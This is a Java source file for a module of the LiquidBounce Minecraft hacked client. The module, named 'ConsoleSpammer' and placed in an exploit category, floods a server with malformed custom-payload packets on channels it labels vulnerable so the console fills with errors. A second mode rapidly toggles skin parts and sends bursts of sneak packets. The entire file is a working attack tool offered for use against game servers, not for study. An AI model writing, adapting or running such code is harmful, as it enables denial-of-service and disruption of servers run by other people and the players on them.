
package net.ccbluex.liquidbounce.features.module.modules.exploit;

import net.ccbluex.liquidbounce.event.EventTarget;
import java.util.Random;
import net.minecraft.entity.Entity;
import net.minecraft.network.play.client.C0BPacketEntityAction;
import net.minecraft.entity.player.EnumPlayerModelParts;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import net.ccbluex.liquidbounce.event.events.UpdateEvent;
import net.ccbluex.liquidbounce.utils.misc.RandomUtils;
import io.netty.buffer.Unpooled;
import net.ccbluex.liquidbounce.utils.timer.MSTimer;
import net.minecraft.network.PacketBuffer;
import net.ccbluex.liquidbounce.valuesystem.types.IntegerValue;
import net.ccbluex.liquidbounce.valuesystem.types.ListValue;
import net.ccbluex.liquidbounce.features.module.ModuleCategory;
import net.ccbluex.liquidbounce.features.module.ModuleInfo;
import net.ccbluex.liquidbounce.features.module.Module;

@ModuleInfo(name = "ConsoleSpammer", description = "Spams the console of the server with errors.", category = ModuleCategory.EXPLOIT)
public class ConsoleSpammer extends Module
{
    private final ListValue modeValue;
    private final IntegerValue delayValue;
    private final PacketBuffer payload;
    private final String[] vulnerableChannels;
    private final MSTimer msTimer;
    
    public ConsoleSpammer() {
        this.modeValue = new ListValue("Mode", new String[] { "Payload", "MineSecure" }, "Payload");
        this.delayValue = new IntegerValue("Delay", 0, 0, 500);
        this.vulnerableChannels = new String[] { "MC|BEdit", "MC|BSign", "MC|TrSel", "MC|PickItem" };
        this.payload = new PacketBuffer(Unpooled.buffer());
        this.msTimer = new MSTimer();
        final byte[] rawPayload = new byte[RandomUtils.getRandom().nextInt(128)];
        RandomUtils.getRandom().nextBytes(rawPayload);
        this.payload.writeBytes(rawPayload);
    }
    
    @EventTarget
    public void onUpdate(final UpdateEvent event) {
        if (!this.msTimer.hasTimePassed(this.delayValue.asInteger())) {
            return;
        }
        final String mode = this.modeValue.asString();
        final String lowerCase = mode.toLowerCase();
        switch (lowerCase) {
            case "payload": {
                ConsoleSpammer.mc.getNetHandler().addToSendQueue((Packet)new C17PacketCustomPayload(this.vulnerableChannels[RandomUtils.getRandom().nextInt(this.vulnerableChannels.length)], this.payload));
                break;
            }
            case "minesecure": {
                final Random random = RandomUtils.getRandom();
                ConsoleSpammer.mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.HAT, random.nextBoolean());
                ConsoleSpammer.mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.JACKET, random.nextBoolean());
                ConsoleSpammer.mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.LEFT_PANTS_LEG, random.nextBoolean());
                ConsoleSpammer.mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.RIGHT_PANTS_LEG, random.nextBoolean());
                ConsoleSpammer.mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.LEFT_SLEEVE, random.nextBoolean());
                ConsoleSpammer.mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.RIGHT_SLEEVE, random.nextBoolean());
                for (int i = 0; i < 5; ++i) {
                    ConsoleSpammer.mc.getNetHandler().addToSendQueue((Packet)new C0BPacketEntityAction((Entity)ConsoleSpammer.mc.thePlayer, C0BPacketEntityAction.Action.STOP_SNEAKING));
                    ConsoleSpammer.mc.getNetHandler().addToSendQueue((Packet)new C0BPacketEntityAction((Entity)ConsoleSpammer.mc.thePlayer, C0BPacketEntityAction.Action.START_SNEAKING));
                }
                break;
            }
        }
    }
}
